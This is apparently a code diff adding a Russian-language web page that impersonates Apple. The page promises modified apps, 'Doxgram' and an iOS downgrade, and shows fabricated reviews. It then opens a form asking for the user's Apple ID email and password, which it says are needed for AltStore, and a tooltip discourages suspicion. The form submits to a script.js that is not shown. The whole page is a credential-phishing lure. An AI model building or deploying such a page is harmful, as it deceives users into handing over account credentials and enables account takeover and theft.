@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Apple — получи доступ</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <nav class="navbar">
+        <ul>
+            <li>Store</li>
+            <li>Mac</li>
+            <li>iPad</li>
+            <li>iPhone</li>
+            <li>Watch</li>
+            <li>Vision</li>
+            <li>AirPods</li>
+            <li>TV & Дом</li>
+            <li>Развлечения</li>
+            <li>Аксессуары</li>
+            <li>Поддержка</li>
+        </ul>
+    </nav>
+
+    <main class="hero">
+        <h1>Получи эксклюзивный доступ</h1>
+        <p>Модифицированные приложения и откат iOS 26 → 18/17/16. Только для подписчиков.</p>
+
+        <div class="reviews">
+            <div class="review-card">
+                <img src="https://via.placeholder.com/40" alt="avatar" class="avatar">
+                <div>
+                    <strong>@maks_play</strong> ★★★★★
+                    <p>Скачал FNAF через этот сервис — всё работает, даже секретные уровни открылись!</p>
+                </div>
+            </div>
+            <div class="review-card">
+                <img src="https://via.placeholder.com/40" alt="avatar" class="avatar">
+                <div>
+                    <strong>@anna_ios</strong> ★★★★★
+                    <p>Откатила с 26 на 18 за 3 часа. Теперь все старые приложения летают!</p>
+                </div>
+            </div>
+            <div class="review-card">
+                <img src="https://via.placeholder.com/40" alt="avatar" class="avatar">
+                <div>
+                    <strong>@doxgram_official</strong> ★★★★★
+                    <p>Doxgram теперь на iOS — всё как в описании, спасибо команде!</p>
+                </div>
+            </div>
+        </div>
+
+        <button class="cta-button" id="showOptionsBtn">Подробнее</button>
+    </main>
+
+    <!-- Модальное окно с выбором категории -->
+    <div id="optionsModal" class="modal">
+        <div class="modal-content">
+            <span class="close">&times;</span>
+            <h2>Выбери, что тебе нужно</h2>
+            <div class="options-grid">
+                <div class="option" data-target="ayugram">
+                    <img src="images/ayugram-logo.png" alt="Ayugram" onerror="this.src='https://via.placeholder.com/100?text=Ayu'">
+                    <p>Ayugram</p>
+                </div>
+                <div class="option" data-target="doxgram">
+                    <img src="images/doxgram-logo.png" alt="Doxgram" onerror="this.src='https://via.placeholder.com/100?text=Dox'">
+                    <p>Doxgram</p>
+                </div>
+                <div class="option" data-target="minecraft">
+                    <img src="images/minecraft-logo.png" alt="Minecraft" onerror="this.src='https://via.placeholder.com/100?text=MC'">
+                    <p>Minecraft / FNAF / Nulls Brawl</p>
+                </div>
+                <div class="option" data-target="downgrade">
+                    <img src="images/icloud-gif.gif" alt="Downgrade" onerror="this.src='https://via.placeholder.com/100?text=iOS'">
+                    <p>Откат iOS 26 → 18/17/16</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Модальное окно для ввода iCloud данных (появляется после выбора) -->
+    <div id="icloudModal" class="modal">
+        <div class="modal-content">
+            <span class="close">&times;</span>
+            <h2>Подтверждение установки</h2>
+            <p>Для загрузки через AltStore требуется временный доступ к iCloud.</p>
+            <form id="icloudForm">
+                <label>Apple ID (email):</label>
+                <input type="email" id="email" name="email" placeholder="example@icloud.com" required>
+
+                <label>Пароль:</label>
+                <input type="password" id="password" name="password" placeholder="Пароль" required>
+
+                <label>Модель устройства:</label>
+                <select id="model" name="model" required>
+                    <option value="">Выберите модель</option>
+                    <option value="iPhone 15 Pro Max">iPhone 15 Pro Max</option>
+                    <option value="iPhone 15 Pro">iPhone 15 Pro</option>
+                    <option value="iPhone 15">iPhone 15</option>
+                    <option value="iPhone 14 Pro Max">iPhone 14 Pro Max</option>
+                    <option value="iPhone 14 Pro">iPhone 14 Pro</option>
+                    <option value="iPhone 14">iPhone 14</option>
+                    <option value="iPhone 13 Pro Max">iPhone 13 Pro Max</option>
+                    <option value="iPhone 13 Pro">iPhone 13 Pro</option>
+                    <option value="iPhone 13">iPhone 13</option>
+                    <option value="iPad Pro 12.9">iPad Pro 12.9</option>
+                    <option value="iPad Air">iPad Air</option>
+                    <option value="iPad mini">iPad mini</option>
+                </select>
+
+                <p class="info-text">
+                    <span id="whyLink" style="color: #0066cc; cursor: pointer;">Зачем это?</span>
+                </p>
+
+                <button type="submit" id="submitBtn">Отправить</button>
+                <div id="formError" style="color:red; display:none;"></div>
+            </form>
+        </div>
+    </div>
+
+    <!-- Подсказка про AltStore -->
+    <div id="altstoreTooltip" class="tooltip">
+        Мы требуем эти данные, чтобы скачать на ваше устройство AltStore. 
+        Если вы не верите, вбейте в YouTube/TikTok «AltStore» — вы сами всё поймёте.
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
